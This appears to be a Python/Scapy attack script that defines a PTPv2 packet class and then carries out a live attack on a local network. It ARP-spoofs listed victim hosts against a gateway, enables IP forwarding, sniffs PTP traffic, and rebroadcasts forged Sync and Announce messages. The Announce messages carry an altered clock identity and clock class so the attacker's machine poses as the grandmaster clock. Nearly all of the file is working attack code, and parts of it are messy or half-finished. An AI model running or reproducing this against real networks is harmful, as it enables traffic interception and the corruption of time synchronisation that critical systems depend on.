from scapy.all import *
from fields import PortIdentityField, TimestampField, ClockIdentityField
from scapy.fields import BitEnumField, BitField, ByteField, ConditionalField, FlagsField, \
        LongField, ShortField, SignedByteField, XBitField, XByteField, XIntField, XStrFixedLenField
from scapy.layers.l2 import Ether
from scapy.packet import Packet
# from IEEE588 import IEEE588

from scapy.all import ARP, Ether, IP, UDP, Raw, sniff, sendp
import os
import sys
import time

class IEEE588(Packet):
    name = "PTPv2"

    MSG_TYPES = {
        0x0: "Sync",
        0x2: "PdelayReqest",
        0x3: "PdelayResponse",
        0x8: "FollowUp",
        0xA: "PdelayResponseFollowUp",
        0xb: "Announce" 
    }

    FLAGS = [
        "LI61", "LI59", "UTC_REASONABLE", "TIMESCALE",
        "TIME_TRACEABLE", "FREQUENCY_TRACEABLE", "SYNCHRONIZATION_UNCERTAIN", "?",
        "ALTERNATE_MASTER", "TWO_STEP", "UNICAST", "?",
        "?", "profileSpecific1", "profileSpecific2", "SECURITY",
    ]

    fields_desc = [
        BitField("transportSpecific", 1, 4),
        BitEnumField("messageType", 0, 4, MSG_TYPES),
        XBitField("reserved0", 0, 4),
        BitField("versionPTP", 0x2, 4),
        ShortField("messageLength", 34),
        ByteField("domainNumber", 0),
        XByteField("reserved1", 0),
        FlagsField("flags", 0, 16, FLAGS),
        LongField("correctionField", 0),
        XIntField("reserved2", 0),
        PortIdentityField("sourcePortIdentity", 0),
        ShortField("sequenceId", 0),
        XByteField("control", 0),
        SignedByteField("logMessageInterval", -3),

        
        ConditionalField(TimestampField("preciseOriginTimestamp", 0), lambda pkt: pkt.is_followup),
        ConditionalField(XStrFixedLenField("informationTlv", 0, 32), lambda pkt: pkt.is_followup),
        ConditionalField(XStrFixedLenField("ClockIdentity", 0,64), lambda pkt: pkt.is_followup),

        #
        # ConditionalField(ClockIdentityField("grandmasterClockClass",0),lambda pkt: pkt.is_Announce),

        # PdelayReq
        ConditionalField(BitField("reserved4", 0, 80), lambda pkt: pkt.is_pdelay_req),
        ConditionalField(BitField("reserved5", 0, 80), lambda pkt: pkt.is_pdelay_req),

        # PdelayResp
        ConditionalField(
            TimestampField("requestReceiptTimestamp", 0),
            lambda pkt: pkt.is_pdelay_resp),

        # PdelayRespFollowUp
        ConditionalField(
            TimestampField("responseOriginTimestamp", 0),
            lambda pkt:pkt.is_pdelay_resp_followup),

        ConditionalField(
            PortIdentityField("requestingPortIdentity", 0),
            lambda pkt: pkt.is_pdelay_resp or pkt.is_pdelay_resp_followup),
    ]

    @property
    def is_sync(self):
        return(self.messageType == 0x0)

    @property
    def is_followup(self):# pkts = sniff(filter="udp and (port 319 or port 320)", prn=dissect_and_resend_ptpv2, count=60)
    #pkts = sniff(filter="udp and (port 319 or port 320)", count=60)
        return(self.messageType == 0x8)
    @property
    def is_Announce(self):
        return(self.messageType == 0xb)
    @property
    def is_pdelay_req(self):
        return(self.messageType == 0x2)

    @property
    def is_pdelay_resp(self):
        return(self.messageType == 0x3)

    @property
    def is_pdelay_resp_followup(self):
        return(self.messageType == 0xA)

    def extract_padding(self, s):
        return "", s


packet_count = {"0x0": 0, "0x8": 0, "0xb": 0, "0x1": 0, "0x9": 0}  # Message type counters
rand_precentage = list()  # List to store random percentages

victimIPs = ["192.168.100.100", "192.168.100.101"]
gatewayIP = "192.168.0.1"  # Assuming this is your gateway IP address

def get_mac(IP):
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, iface = 'enp1s0', inter = 0.1)
    for snd,rcv in ans:
        return rcv.sprintf(r"%Ether.src%")

# Function to enable IP forwarding
def enable_ip_forwarding():
    print ("\n[*] Enabling IP Forwarding...\n")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

# Function to perform ARP spoofing
def arp_spoof(victimIP, gatewayIP):
    print(f"[*] Performing ARP spoofing between {victimIP} and {gatewayIP}")
    arp_victim = ARP(op=2, pdst=victimIP, psrc=gatewayIP, hwdst=get_mac(victimIP))
    send(arp_victim, verbose=False)
    arp_gateway = ARP(op=2, pdst=gatewayIP, psrc=victimIP, hwdst=get_mac(gatewayIP))
    send(arp_gateway, verbose=False)

# Function to dissect and resend PTPv2 packets
def dissect_and_resend_ptpv2(packet):
    global packet_count

    if 'UDP' in packet and 'IP' in packet and Raw in packet:
        packet[Ether].src = '64:31:50:18:80:18'
        ptp_payload = packet[Raw].load
        ptp_packet = IEEE588(ptp_payload)

        if ptp_packet.messageType == 0x0:
            packet_count['0x0'] += 1
            print("found A Sync message:")
            ptp_packet.sequenceId += 1
        elif ptp_packet.messageType == 0x8:
            packet_count['0x8'] += 1
            print("found A Follow_Up message:")
            time_before = ptp_packet.preciseOriginTimestamp
            precentage_of_packets = 0.01  # Example percentage
            fraction = 1 + (packet_count['0x8'] * precentage_of_packets)
        elif ptp_packet.messageType == 0xb:
            packet_count['0xb'] += 1
        elif ptp_packet.messageType == 0x1:
            packet_count['0x1'] += 1
        elif ptp_packet.messageType == 0x9:
            packet_count['0x9'] += 1

        print("\nPTPv2 Fields:")

        # Sending back spoofed Sync packets
        if ptp_packet.messageType == 0x0:
            spoofed_packet = Ether(src='64:31:50:18:80:18', dst='ff:ff:ff:ff:ff:ff') / \
                             IP(src='192.168.100.101', dst='224.0.1.129') / \
                             UDP(sport=319, dport=319) / \
                             Raw(ptp_payload)
            sendp(spoofed_packet, iface="enp1s0", verbose=False)

        elif ptp_packet.messageType == 0xb:  # Manipulation of the Announce message
            print("----------------------------------")
            ptp_packet.sourcePortIdentity = '64:31:50:18:80:18'
            ptp_packet.sequenceId += 1
            ptp_packetSend = bytes(ptp_packet).rstrip(b'\x00')  # Remove padding
            byte_sequence = ptp_packetSend
            print(byte_sequence)
            print("-----------------------")
            modified_byte_sequence = byte_sequence.replace(b'\x18\xa9\x05\xff\xfe\xbc\xcel',
                                                            b'\x64\x31\x50\xff\xfe\x18\x80\x18')  # Modify clock identity
            modified_byte_sequence = modified_byte_sequence.replace(b'\xf8', b'\xf5')  # Modify clock class
            spoofed_packet = Ether(src='64:31:50:18:80:18', dst='ff:ff:ff:ff:ff:ff') / \
                IP(src='192.168.100.101', dst='224.0.1.129') / \
                            UDP(sport=320, dport=320) / \
                             Raw(modified_byte_sequence)
            sendp(spoofed_packet, iface="enp1s0", verbose=False)
            time.sleep(2)
            print("----------------------------------")

            # Perform ARP spoofing between victim and gateway
            arp_spoof("192.168.100.100", "192.168.100.101")

# Start ARP spoofing for the gateway
spoofed_packet = ARP(op=2, pdst="224.0.1.129", psrc=gatewayIP)
sendp(spoofed_packet, verbose=False)

# Start ARP spoofing for each victim
for victimIP in victimIPs:
    arp_spoof(victimIP, gatewayIP)

# Capture and dissect PTPv2 packets
pkts = sniff(filter="udp and (port 319 or port 320)", prn=dissect_and_resend_ptpv2)

print(f"Number of packets captured: {packet_count}")